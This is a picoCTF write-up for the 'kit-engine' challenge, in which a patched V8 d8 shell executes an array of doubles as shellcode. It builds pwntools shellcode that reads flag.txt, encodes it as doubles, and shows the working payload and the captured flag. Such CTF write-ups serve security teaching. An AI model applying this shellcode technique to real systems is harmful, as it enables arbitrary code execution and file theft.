# kit-engine

Shellcode

## Download the Binary

The executable has some size to it (146Mb), so it won't be included in the repo. You can download it [here](https://mercury.picoctf.net/static/57bf78fb7f9fd6e29e72762cc8460f70/d8). 

## checksec

```bash
[*] '/mnt/d/CTFs/picoCTF/Pwn/kit-engine/d8'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

None of this really matters because the patched (by the challenge creators) d8 shell literally will run our shellcode for us. 

## Overview of Binary

V8 is Google's own JavaScript (and WebAssembly) engine that is used in Chrome, and d8 is V8's own developer shell (and JS interpreter). A quick introduction to d8 is accessible [here](https://v8.dev/docs/d8). 

In this challenge, a patch is applied to the source code of the d8 shell which provides 2 helpful functions in the global template of the intepreted JS script - `AssembleEngine` and `Breakpoint`. 

While the exact details of implementation are available in the [patch file](./source/patch), concisely, 
- `AssembleEngine()` accepts exactly 1 argument, an array of doubles, of which each is interpreted as an unsigned 64-bit long int to be written into an `mmap`-ed piece of memory which is then executed as shellcode. 
- `Breakpoint()` requires no arguments. It simply contains an `int3` interrupt instruction that occurs when the function is called in the interpreted JS so that a debugger can be used to step through subsequent instructions. 

The reason why the API for `AssemblyEngine()` is an array of doubles is probably so that
1. we no longer have to worry about special characters causing issues (the handling of which would be specific to the JS spec/version and/or the interpreter in d8), and to
2. make the challenge harder (`AssembleEngine` could have accepted unsigned 64-bit ints and it would probably still work)

To illustrate `AssemblyEngine()`, consider the following single-line script in a `test.js` file which we run with d8 using the command `./d8 test.js`

```js 
AssembleEngine([1.1, 1.1])
```

The output is

```c
Memory Dump. Watch your endianness!!:
0: float 1.100000 hex 3ff199999999999a
1: float 1.100000 hex 3ff199999999999a
Starting your engine!!
Received signal 4 ILL_ILLOPN 7f370ee0e000

==== C stack trace ===============================

 [0x557e1fc4ecd7]
 [0x7f370ead9520]
 [0x7f370ee0e000]
[end of stack trace]
Illegal instruction
```

## Finding the original `src/d8/d8.cc` and `src/d8/d8.h` (Not required)

> This is not necessary, but I did this because I thought the patch would expose a vulnerability (instead of directly being the solution) in the d8 binary that would only be able to be found by looking through the source code. 

We first have to `git clone` the repo from https://github.com/v8/v8 before we can begin digging for the files. 

The first few lines of `patch` reveal part of the hash of the blob of the unmodified d8.cc file. 

```
diff --git a/src/d8/d8.cc b/src/d8/d8.cc
index e6fb20d152..35195b9261 100644
--- a/src/d8/d8.cc
+++ b/src/d8/d8.cc
```

We can then use git's `cat-file` functionality to dump the file out, where the `-p` option instructs `cat-file` to figure the type of content before dumping it. 

```bash
git cat-file -p e6fb20d152 > ../original_d8.cc
```

Similar steps can be performed to obtain the pre-patched `d8.h` file. 

## Spawn a shell?

Notice the following lines in [server.py](./server.py). 

```python
with tempfile.NamedTemporaryFile(buffering=0) as f:
    f.write(script_contents.encode("utf-8"))
    p("File written. Running. Timeout is 20s")
    res = subprocess.run(["./d8", f.name], timeout=20, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    p("Run Complete")
    p(f"Stdout {res.stdout}")
    p(f"Stderr {res.stderr}")
```

`server.py` isn't going to let us interact with our process, so we can't just use the shellcode `pwnlib.shellcraft.amd64.linux.sh` to spawn a local shell and try to type in "cat flag.txt" as is typically done in for most Pwn challenges. 

Instead, we use pwntool's `pwnlib.shellcraft.amd64.linux.cat` to cat the flag, which uses an `open` and a `sendfile` syscall to send the contents of the fd (file descriptor) returned by `open` to stdout (fd 1). 

> Side note: We could spawn bind shell / reverse shell and remotely interact with the shell within the 20s timeout, but that's (in my opinion) over-complicating this challenge. 

## Payload

The shellcode is crafted with provisions made to
1. pad the payload with nops to the 8-byte boundary for easy conversion into doubles, and
2. change `ffffff7f` to `01010101` so that none of the doubles become NaNs (see the [IEEE 754 FP standard](https://en.wikipedia.org/wiki/IEEE_754#Special_values) for the interpretation when the exponent portion is all 1s or all 0s). 

Shellcode construction is shown below, and the rest of the solve script can be accessed at [solve.py](./solve.py). 

```python
# Construct bytecode to cat flag.txt
payload_asm = shellcraft.amd64.linux.cat('flag.txt', 1)

# Change the no. of bytes to be sent in the sendfile syscall from 0x7fffffff to 0x01010101 so that the double doesn't become a NaN
payload_asm = payload_asm.replace('0x7fffffff', '0x01010101')
payload_bytes = asm(payload_asm)

# Pad the end of payload_bytes with nops up till the 8-byte boundary (since doubles are 8-bytes long)
padding = (8 - len(payload_bytes)%8) * asm(pwnlib.shellcraft.amd64.nop())
payload_bytes += padding
```

## Flag

```bash
[*] payload_bytes.hex()='6a01fe0c2448b8666c61672e747874506a02584889e731f60f0541ba010101014889c66a28586a015f990f0590909090'
[*] 48
[*] payload_js='AssembleEngine([6.603257119849832e+186, 3.792519361765274e+79, -2.2023024389345214e+261, 7.748609217167448e-304, 7.683199690136903e-302, -6.82852360667106e-229])'
[+] Opening connection to mercury.picoctf.net on port 17805: Done
[*] Switching to interactive mode

AssembleEngine([6.603257119849832e+186, 3.792519361765274e+79, -2.2023024389345214e+261, 7.748609217167448e-304, 7.683199690136903e-302, -6.82852360667106e-229])
File written. Running. Timeout is 20s
Run Complete
Stdout b'picoCTF{vr00m_vr00m_ ca5a2f612129286}\n'
Stderr b'Received signal 11 SEGV_MAPERR 000000000026\n\n==== C stack trace ===============================\n\n [0x55a17e3f1cd7]\n [0x7f738eca3980]\n [0x7f738f0d8030]\n[end of stack trace]\n'
```

The SEGV_MAPERR is due to the shellcode not returning after it concludes its syscalls (at least that's what I got when running it locally) - the CPU is simply attempting to decode the uninitialized data after the shellcode as instructions. 